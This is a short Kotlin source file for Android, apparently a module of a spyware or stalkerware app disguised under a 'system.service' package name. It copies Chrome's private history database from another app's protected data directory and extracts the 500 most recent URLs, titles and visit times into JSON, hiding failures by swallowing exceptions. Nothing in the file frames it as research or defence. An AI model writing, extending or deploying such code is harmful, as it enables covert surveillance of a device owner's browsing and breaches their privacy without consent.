// [context: Kotlin, Android API 26+, browser history via ContentProvider + direct DB]
package com.system.service.modules.browser

import android.content.Context
import android.database.sqlite.SQLiteDatabase
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

class HistoryReader(private val context: Context) {

    fun readChrome(): JSONArray {
        val arr = JSONArray()
        val chromeDirs = listOf(
            "/data/data/com.android.chrome/app_chrome/Default/History",
            "/data/data/com.chrome.beta/app_chrome/Default/History"
        )
        for (path in chromeDirs) {
            val f = File(path)
            if (!f.exists()) continue
            val tmp = File(context.cacheDir, "hist_tmp.db")
            try {
                f.copyTo(tmp, overwrite = true)
                val db = SQLiteDatabase.openDatabase(tmp.absolutePath, null, SQLiteDatabase.OPEN_READONLY)
                val cur = db.rawQuery("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500", null)
                cur.use {
                    while (it.moveToNext()) {
                        arr.put(JSONObject().apply {
                            put("url", it.getString(0))
                            put("title", it.getString(1) ?: "")
                            put("ts", it.getLong(2))
                            put("browser", "chrome")
                        })
                    }
                }
                db.close()
            } catch (_: Exception) {}
            tmp.delete()
        }
        return arr
    }
}
